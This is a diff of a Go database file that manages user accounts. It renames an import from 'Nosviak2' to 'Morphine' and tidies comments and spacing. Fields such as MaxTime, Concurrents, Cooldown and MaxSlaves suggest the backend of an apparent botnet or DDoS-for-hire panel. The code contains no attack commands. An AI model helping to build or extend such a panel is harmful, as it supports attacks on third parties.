@@ -1,22 +1,20 @@
 package database
 
 import (
-	"Nosviak2/core/sources/tools"
+	"Morphine/core/sources/tools"
 
 	"time"
 )
 
-//stores the users information properly
-//this will allow for better handling without issues
+// stores the users information properly
+// this will allow for better handling without issues
 type User struct { //stored in type structure
-	Identity, Parent int //pretty much stores the users position inside the database
+	Identity, Parent                                                         int    //pretty much stores the users position inside the database
 	Username, Password, Ranks, Theme, MFA_secret, Plan, LockedAddress, Token string //stores the username & password properly without issues
-	MaxTime, Concurrents, Cooldown, MaxSessions, MaxSlaves int //stores the maxtime etc properly without issues happening
-	NewUser, Locked bool //stores if the user is type new user properly
-	Expiry, Created, Updated int64 //stores the users due expiry date properly
+	MaxTime, Concurrents, Cooldown, MaxSessions, MaxSlaves                   int    //stores the maxtime etc properly without issues happening
+	NewUser, Locked                                                          bool   //stores if the user is type new user properly
+	Expiry, Created, Updated                                                 int64  //stores the users due expiry date properly
 }
-
-
 
 // EditUser edits the users fields
 func (c *Connection) EditUser(user *User) error {
@@ -24,9 +22,8 @@ func (c *Connection) EditUser(user *User) error {
 	return err
 }
 
-
-//correctly tries to authenticate the user into the system
-//this will properly try to scan the database for the username without issues
+// correctly tries to authenticate the user into the system
+// this will properly try to scan the database for the username without issues
 func (c *Connection) FindUser(user string) (*User, error) {
 	user = tools.SanatizeTool(user)
 	//correctly querys the function without issues
@@ -42,14 +39,14 @@ func (c *Connection) FindUser(user string) (*User, error) {
 	if err := RowBus.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token); err != nil {
 		return nil, err //returns the correctly properly
 	}
- 
+
 	//returns the information
 	//this will make sure its done without issues
 	return &usr, nil //returns structure properly
 }
 
-//gets all the users properly and safely
-//this will ensure its done without issues happening
+// gets all the users properly and safely
+// this will ensure its done without issues happening
 func (c *Connection) GetUsers() ([]User, error) {
 	//correctly querys the sql database
 	//this will ensure its done properly
@@ -81,8 +78,8 @@ func (c *Connection) GetUsers() ([]User, error) {
 	return Users, nil
 }
 
-//tries to correctly create the user without issues
-//this will ensure it happens without errors on request
+// tries to correctly create the user without issues
+// this will ensure it happens without errors on request
 func (c *Connection) MakeUser(u *User) error { //error returned
 	//properly tries to return the information without issues
 	//this will make sure we have properly inserted without errors happening
@@ -90,9 +87,8 @@ func (c *Connection) MakeUser(u *User) error { //error returned
 	return err
 }
 
-
-//properly tries to edit the ranks without issues happening
-//this will make sure its properly done without errors happening
+// properly tries to edit the ranks without issues happening
+// this will make sure its properly done without errors happening
 func (c *Connection) EditRanks(new, user string) error {
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -100,8 +96,8 @@ func (c *Connection) EditRanks(new, user string) error {
 	return err
 }
 
-//correctly tries to update the maxtime
-//this will ensure its done without errors happening
+// correctly tries to update the maxtime
+// this will ensure its done without errors happening
 func (c *Connection) EditMaxTime(new int, user string) error {
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -109,8 +105,8 @@ func (c *Connection) EditMaxTime(new int, user string) error {
 	return err
 }
 
-//correctly tries to update the cooldown
-//this will ensure its done without errors happening
+// correctly tries to update the cooldown
+// this will ensure its done without errors happening
 func (c *Connection) EditCooldown(new int, user string) error {
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -118,8 +114,8 @@ func (c *Connection) EditCooldown(new int, user string) error {
 	return err
 }
 
-//correctly tries to update the concurrents
-//this will ensure its done without errors happening
+// correctly tries to update the concurrents
+// this will ensure its done without errors happening
 func (c *Connection) EditConcurrents(new int, user string) error {
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -127,8 +123,8 @@ func (c *Connection) EditConcurrents(new int, user string) error {
 	return err
 }
 
-//tries to correctly remove the user from the database
-//this will ensure its done without errors triggering on request
+// tries to correctly remove the user from the database
+// this will ensure its done without errors triggering on request
 func (c *Connection) RemoveUser(user string) error { //returns the error founded
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -136,8 +132,8 @@ func (c *Connection) RemoveUser(user string) error { //returns the error founded
 	return err
 }
 
-//updates the password correctly and safely
-//this will change a users password inside the database without issues
+// updates the password correctly and safely
+// this will change a users password inside the database without issues
 func (c *Connection) Password(password, user string) error {
 	user = tools.SanatizeTool(user)
 	password = tools.SanatizeTool(password)
@@ -146,8 +142,8 @@ func (c *Connection) Password(password, user string) error {
 	return err
 }
 
-//disables the new user option properly
-//this will ensure its done without any errors
+// disables the new user option properly
+// this will ensure its done without any errors
 func (c *Connection) DisableNewUser(user string) error { //returns the information
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -155,8 +151,8 @@ func (c *Connection) DisableNewUser(user string) error { //returns the informati
 	return err
 }
 
-//enables the new user option properly
-//this will ensure its done without any errors
+// enables the new user option properly
+// this will ensure its done without any errors
 func (c *Connection) EnableNewUser(user string) error { //returns the information
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -164,8 +160,8 @@ func (c *Connection) EnableNewUser(user string) error { //returns the informatio
 	return err
 }
 
-//edit the max slaves option properly
-//this will ensure its done without any errors
+// edit the max slaves option properly
+// this will ensure its done without any errors
 func (c *Connection) EditMaxSlaves(user string, new int) error { //returns the information
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -173,9 +169,8 @@ func (c *Connection) EditMaxSlaves(user string, new int) error { //returns the i
 	return err
 }
 
-
-//this will update the users theme
-//allows for better control without issues
+// this will update the users theme
+// allows for better control without issues
 func (c *Connection) Theme(user string, newTheme string) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	newTheme = tools.SanatizeTool(newTheme)
@@ -184,8 +179,8 @@ func (c *Connection) Theme(user string, newTheme string) error { //returns error
 	return err
 }
 
-//this will update the users apikey
-//allows for better control without issues
+// this will update the users apikey
+// allows for better control without issues
 func (c *Connection) APIKey(user string, apikey string) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	apikey = tools.SanatizeTool(apikey)
@@ -194,8 +189,8 @@ func (c *Connection) APIKey(user string, apikey string) error { //returns error 
 	return err
 }
 
-//this will update the expiry left
-//allows for proper controlling without issues
+// this will update the expiry left
+// allows for proper controlling without issues
 func (c *Connection) Expiry(user string, expiry int64) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -203,8 +198,8 @@ func (c *Connection) Expiry(user string, expiry int64) error { //returns error p
 	return err
 }
 
-//either lock or unlock the account
-//allows for proper controlling without issues
+// either lock or unlock the account
+// allows for proper controlling without issues
 func (c *Connection) Lock(user string) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -212,8 +207,8 @@ func (c *Connection) Lock(user string) error { //returns error properly
 	return err
 }
 
-//either lock or unlock the account
-//allows for proper controlling without issues
+// either lock or unlock the account
+// allows for proper controlling without issues
 func (c *Connection) Unlock(user string) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -221,8 +216,8 @@ func (c *Connection) Unlock(user string) error { //returns error properly
 	return err
 }
 
-//remove mfa from the account properly
-//allows for proper controlling without issues
+// remove mfa from the account properly
+// allows for proper controlling without issues
 func (c *Connection) RmMFA(user string) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -230,8 +225,8 @@ func (c *Connection) RmMFA(user string) error { //returns error properly
 	return err
 }
 
-//either lock or unlock the account
-//allows for proper controlling without issues
+// either lock or unlock the account
+// allows for proper controlling without issues
 func (c *Connection) Sessions(user string, amount int) error { //returns error properly
 	user = tools.SanatizeTool(user)
 	c.Updated(user) //updates the updated period unix properly
@@ -239,15 +234,15 @@ func (c *Connection) Sessions(user string, amount int) error { //returns error p
 	return err
 }
 
-//updates the users update time
-//this will ensure its done without any errors
+// updates the users update time
+// this will ensure its done without any errors
 func (c *Connection) Updated(user string) {
 	user = tools.SanatizeTool(user)
 	c.Conn.Exec("UPDATE `users` SET `updated` = ? WHERE `username` = ?", time.Now().Unix(), user)
 }
 
-//gets all the users properly and safely
-//this will ensure its done without issues happening
+// gets all the users properly and safely
+// this will ensure its done without issues happening
 func (c *Connection) ParentTracer(peer int) ([]User, error) {
 	//correctly querys the sql database
 	//this will ensure its done properly
@@ -255,7 +250,6 @@ func (c *Connection) ParentTracer(peer int) ([]User, error) {
 	if err != nil { //correctly error handles the database properly
 		return make([]User, 0), err //returns the error properly
 	}
-
 
 	defer rows.Close()
 	//stores all the login requests we will store
@@ -280,8 +274,8 @@ func (c *Connection) ParentTracer(peer int) ([]User, error) {
 	return Users, nil
 }
 
-//gets the user via the parent id
-//allows for proper control without issues
+// gets the user via the parent id
+// allows for proper control without issues
 func (c *Connection) GetUserViaParent(peer int) (*User, error) {
 	//correctly querys the function without issues
 	//this ensures its done properly without errors happening
@@ -296,15 +290,15 @@ func (c *Connection) GetUserViaParent(peer int) (*User, error) {
 	if err := RowBus.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token); err != nil {
 		return nil, err //returns the correctly properly
 	}
- 
+
 	//returns the information
 	//this will make sure its done without issues
 
 	return &usr, nil //returns structure properly
-} 
+}
 
-//gets the user via the parent id
-//allows for proper control without issues
+// gets the user via the parent id
+// allows for proper control without issues
 func (c *Connection) GetUserViaToken(token string) (*User, error) {
 	//correctly querys the function without issues
 	//this ensures its done properly without errors happening
@@ -319,9 +313,9 @@ func (c *Connection) GetUserViaToken(token string) (*User, error) {
 	if err := RowBus.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token); err != nil {
 		return nil, err //returns the correctly properly
 	}
- 
+
 	//returns the information
 	//this will make sure its done without issues
 
 	return &usr, nil //returns structure properly
-} 
+}
